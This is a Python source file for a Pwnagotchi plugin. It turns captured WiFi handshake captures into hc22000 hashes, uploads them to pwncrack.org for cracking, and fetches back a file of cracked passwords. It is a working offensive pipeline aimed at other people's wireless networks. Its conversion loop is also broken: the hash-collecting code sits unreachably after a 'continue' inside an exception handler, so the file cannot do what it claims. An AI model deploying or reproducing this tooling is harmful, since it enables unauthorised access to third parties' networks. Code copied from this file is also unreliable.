import time
import os
import subprocess
import requests
import logging
import json
from threading import Lock
from pwnagotchi.plugins import Plugin


class BetterPwncrack(Plugin):
    __author__ = 'charveey'
    __version__ = '1.0.1'
    __license__ = 'GPL3'
    __description__ = 'Converts .pcap files to .hc22000 and uploads them to pwncrack.org when internet is available.'

    def __init__(self):
        self.server_url = 'https://pwncrack.org/upload_handshake'
        self.potfile_url = 'https://pwncrack.org/download_potfile_script'
        self.timewait = 600
        self.last_run_time = 0
        self.options = dict()
        self.lock = Lock()

        # These are set in on_config_changed
        self.handshake_dir = None
        self.key = None
        self.whitelist = []
        self.potfile_path = None
        self.status_path = None
        self.uploaded = set()

    def on_loaded(self):
        logging.info('[better-pwncrack] Plugin loaded.')

    def on_config_changed(self, config):
        self.handshake_dir = config["bettercap"].get("handshakes", "/root/handshakes")
        self.key = self.options.get('key', "")
        self.whitelist = config["main"].get("whitelist", [])
        self.potfile_path = os.path.join(self.handshake_dir, 'cracked.pwncrack.potfile')
        self.status_path = os.path.join(self.handshake_dir, '.pwncrack_uploaded.json')
        self._load_status()
        logging.info(f'[better-pwncrack] Config loaded. Handshake dir: {self.handshake_dir}')

    def _load_status(self):
        """Load the set of already-uploaded pcap filenames from disk."""
        if self.status_path and os.path.exists(self.status_path):
            try:
                with open(self.status_path, 'r') as f:
                    self.uploaded = set(json.load(f))
                logging.debug(f'[better-pwncrack] Loaded {len(self.uploaded)} previously uploaded entries.')
            except Exception as e:
                logging.warning(f'[better-pwncrack] Could not load status file: {e}')
                self.uploaded = set()
        else:
            self.uploaded = set()

    def _save_status(self):
        """Persist the set of uploaded pcap filenames to disk."""
        try:
            with open(self.status_path, 'w') as f:
                json.dump(list(self.uploaded), f)
        except Exception as e:
            logging.warning(f'[better-pwncrack] Could not save status file: {e}')

    def on_internet_available(self, agent):
        # Guard: config must be loaded first
        if not self.handshake_dir or not self.key:
            logging.warning('[better-pwncrack] Config not ready yet, skipping.')
            return

        current_time = time.time()
        remaining = self.timewait - (current_time - self.last_run_time)
        if remaining > 0:
            logging.debug(f'[better-pwncrack] Waiting {remaining:.1f}s before next run.')
            return

        if self.lock.locked():
            logging.debug('[better-pwncrack] Already running, skipping.')
            return

        self.last_run_time = current_time
        logging.info(f'[better-pwncrack] Starting upload process.')

        try:
            with self.lock:
                self.last_run_time = time.time()
                self._convert_and_upload()
                self._download_potfile()
        except Exception as e:
            logging.error(f'[better-pwncrack] Error during upload process: {e}', exc_info=True)

    def _is_whitelisted(self, filename):
        """Check if a filename matches any whitelist entry."""
        return any(item in filename for item in self.whitelist)

    def _convert_and_upload(self):
        try:
            all_pcaps = [
                f for f in os.listdir(self.handshake_dir)
                if f.endswith('.pcap') and not self._is_whitelisted(f)
            ]
        except FileNotFoundError:
            logging.error(f'[better-pwncrack] Handshake dir not found: {self.handshake_dir}')
            return

        # Only process pcaps not yet uploaded
        new_pcaps = [f for f in all_pcaps if f not in self.uploaded]

        if not new_pcaps:
            logging.info('[better-pwncrack] No new .pcap files to upload.')
            return

        logging.info(f'[better-pwncrack] Found {len(new_pcaps)} new pcap(s) to process.')

        successfully_converted = []
        combined_hashes = []

        for pcap_file in new_pcaps:
            pcap_path = os.path.join(self.handshake_dir, pcap_file)
            tmp_hc_path = pcap_path.replace('.pcap', '.tmp.hc22000')

            try:
                result = subprocess.run(
                    ['hcxpcapngtool', '-o', tmp_hc_path, pcap_path],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
            except subprocess.TimeoutExpired:
                logging.warning(f'[better-pwncrack] hcxpcapngtool timed out on {pcap_file}')
                continue

                if os.path.exists(tmp_hc_path) and os.path.getsize(tmp_hc_path) > 0:
                    with open(tmp_hc_path, 'r') as f:
                        hashes = [line.strip() for line in f if line.strip()]
                    combined_hashes.extend(hashes)
                    successfully_converted.append(pcap_file)
                    logging.debug(f'[better-pwncrack] Converted {pcap_file} → {len(hashes)} hash(es).')
                else:
                    logging.debug(f'[better-pwncrack] No hashes extracted from {pcap_file}, skipping.')

            except FileNotFoundError:
                logging.error('[better-pwncrack] hcxpcapngtool not found. Is it installed?')
                return
            finally:
                if os.path.exists(tmp_hc_path):
                    os.remove(tmp_hc_path)

        if not combined_hashes:
            logging.info('[better-pwncrack] No hashes extracted from new pcaps.')
            return

        # Upload the combined hashes as a single file
        combined_content = '\n'.join(combined_hashes)
        try:
            files = {'handshake': ('combined.hc22000', combined_content.encode(), 'text/plain')}
            data = {'key': self.key}
            response = requests.post(self.server_url, files=files, data=data, timeout=30)
            response.raise_for_status()
            logging.info(f'[better-pwncrack] Upload response: {response.json()}')

            # Mark successfully converted pcaps as uploaded
            for pcap_file in successfully_converted:
                self.uploaded.add(pcap_file)
            self._save_status()

        except requests.exceptions.RequestException as e:
            logging.error(f'[better-pwncrack] Upload failed: {e}')

    def _download_potfile(self):
        try:
            response = requests.get(self.potfile_url, params={'key': self.key}, timeout=30)
            if response.status_code == 200:
                with open(self.potfile_path, 'w') as f:
                    f.write(response.text)
                logging.info(f'[better-pwncrack] Potfile saved to {self.potfile_path}')
            else:
                logging.error(f'[better-pwncrack] Potfile download failed: {response.status_code}')
                try:
                    logging.error(f'[better-pwncrack] Server said: {response.json()}')
                except Exception:
                    logging.error(f'[better-pwncrack] Server response: {response.text[:200]}')
        except requests.exceptions.RequestException as e:
            logging.error(f'[better-pwncrack] Potfile download error: {e}')

    def on_unload(self, ui):
        logging.info('[better-pwncrack] Plugin unloaded.')
